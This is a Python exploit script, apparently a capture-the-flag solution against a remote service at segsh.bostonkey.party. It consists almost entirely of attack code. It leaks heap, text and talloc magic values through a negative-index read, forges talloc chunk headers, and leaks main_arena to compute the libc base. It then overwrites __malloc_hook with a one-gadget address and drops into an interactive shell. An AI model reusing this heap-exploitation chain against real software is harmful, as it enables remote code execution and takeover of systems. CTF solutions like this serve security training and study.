#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "segsh.bostonkey.party"
PORT = 6666
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def comm(rx, tx):
    r = rtil_str(rx)
    s.send(tx)
    return r

def parse_stuff(ln):
    lsp = ln.replace("%", "").split(".")[1].split()
    val = 0
    for i in range(len(lsp)):
        val |= (int(lsp[i]) << i * 8)
    return val

rtil_str("__")

star = "Sun"
planet = "Earth"

s.send("1\n")
rtil_str("_")
s.send(star + "\n")
rtil_str("_")
s.send("13\n")
rtil_str("_")
s.send("8600\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send(planet + "\n")
rtil_str("_")
s.send("asdf\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("10\n")
rtil_str("_")
s.send("99\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")

addr = 0x41414141
rtil_str("_")
s.send("R\n")
rtil_str("_")
s.send(str(addr) + "\n")

rtil_str("__")
s.send("6\n")
rtil_str("_")
s.send(star + "\n")
rtil_str("__")

# now we leak
s.send("5\n")
rtil_str("_")
s.send("-1\n")
rtil_str("_")
s.send("y\n")
leak_buf = rtil_str("__")
leak_buf = leak_buf.split("--------------------------------------------------------")[-1].split("254.")[0]
leak_buf = leak_buf.split("\n")


leak_list = []
for l in leak_buf:
    if l != '':
        cns = parse_stuff(l)
        leak_list += [cns]

tmagic = leak_list[18]
a_leak = leak_list[11]
text_leak = leak_list[30]

print "[+] talloc_magic: %s[+]"%hex(tmagic)
print "[+] heap leak: %s [+]" %hex(a_leak)
print "[+] .text leak: %s [+]" %hex(text_leak)

#for l in leak_list:
    #print hex(l)

# we use this planet's name as the "control" buffer
mooney = "mooney"

s.send("6\n")
rtil_str("_")
s.send(mooney + "\n")
rtil_str("_")
s.send("asdf\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("10\n")
rtil_str("_")
s.send("99\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")

ctrl_buf = p64(0x41414141)
ctrl_buf += p64(0x2)
ctrl_buf += p64(0x400)
ctrl_buf += p64(0x0)
ctrl_buf += p64(tmagic + 4)

offset = 0x698			# offset to controlled buffer above

rtil_str("_")
s.send("M\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send(ctrl_buf + "\n")

# we free then we leak in order to 
# get the address of the main_arena
# that will be put at start of free chunk
rtil_str("__")
s.send("2\n")
rtil_str("_")
s.send(planet + "\n")
rtil_str("__")

# now we leak
s.send("5\n")
rtil_str("_")
s.send("-1\n")
rtil_str("_")
s.send("y\n")
leak_buf = rtil_str("__")
leak_buf = leak_buf.split("--------------------------------------------------------")[-1].split("254.")[0]
leak_buf = leak_buf.split("\n")


leak_list = []
for l in leak_buf:
    if l != '':
        cns = parse_stuff(l)
        leak_list += [cns]


main_arena = leak_list[24]
off_hook = 0x78
malloc_hook = main_arena - off_hook
libc_base = main_arena - 0x3be7b8

print "[+] main_arena: %s[+]"%hex(main_arena)
print "[+] malloc_hook: %s[+]"%hex(malloc_hook)
print "[+] libc base: %s[+]"%hex(libc_base)


mooney = "mooney2"

s.send("6\n")
rtil_str("_")
s.send(mooney + "\n")
rtil_str("_")
s.send("asdf\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("10\n")
rtil_str("_")
s.send("99\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")

ctrl_buf = p64(malloc_hook - 0x68)
#ctrl_buf = p64(0x89898989)
ctrl_buf += p64(0x1)
ctrl_buf += p64(0x400)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(0x0)
ctrl_buf += p64(tmagic + 4)

offset = 0x878			# offset to controlled buffer above

rtil_str("_")
s.send("M\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send(ctrl_buf + "\n")

# now we add the planet we use for arb write
rtil_str("__")
pname = "griller"
s.send("6\n")
rtil_str("_")
s.send(pname + "\n")
rtil_str("_")
s.send("asdf\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("10\n")
rtil_str("_")
s.send("99\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")
rtil_str("_")
s.send("0\n")

addr = a_leak + offset + 128
rtil_str("_")
s.send("R\n")
rtil_str("_")
s.send(str(addr) + "\n")

print "[+] fake pool chunk address: %s [+]"%hex(addr)

magic_addr = libc_base + 0xE681D
eip = p64(magic_addr)
s.send("3\n")
rtil_str("_")
s.send(pname + "\n")
rtil_str("_")
s.send("1\n")
rtil_str("_")
s.send(eip + "\n")

rtil_str("__")
s.send("6\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
